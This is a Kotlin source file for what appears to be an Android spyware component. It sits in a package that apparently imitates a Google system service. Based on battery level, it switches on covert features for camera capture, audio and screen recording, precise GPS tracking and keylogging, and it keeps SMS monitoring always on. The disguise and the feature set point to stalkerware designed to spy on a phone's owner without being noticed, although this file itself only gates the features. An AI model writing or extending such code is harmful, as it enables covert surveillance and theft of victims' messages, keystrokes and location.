package com.google.android.systemservice.managers

import android.util.Log

/**
 * Manages which features are active based on battery and charging constraints.
 */
class FeatureToggleManager {

    companion object {
        private const val TAG = "FeatureToggle"
    }

    /**
     * Check if a specific feature should be enabled based on battery constraints.
     */
    fun isFeatureEnabled(feature: Feature, batteryLevel: Int, isCharging: Boolean): Boolean {
        val enabled = when (feature) {
            Feature.CAMERA_CAPTURE -> batteryLevel > 30 || isCharging
            Feature.AUDIO_RECORDING -> batteryLevel > 20 || isCharging
            Feature.SCREEN_RECORDING -> batteryLevel > 40 || isCharging
            Feature.HIGH_FREQUENCY_GPS -> batteryLevel > 50 || isCharging
            Feature.KEYLOGGING -> batteryLevel > 10 || isCharging
            Feature.SMS_MONITORING -> true
        }

        if (!enabled) {
            Log.d(TAG, "Feature $feature disabled due to battery constraints")
        }

        return enabled
    }

    enum class Feature {
        CAMERA_CAPTURE,
        AUDIO_RECORDING,
        SCREEN_RECORDING,
        HIGH_FREQUENCY_GPS,
        KEYLOGGING,
        SMS_MONITORING
    }
}
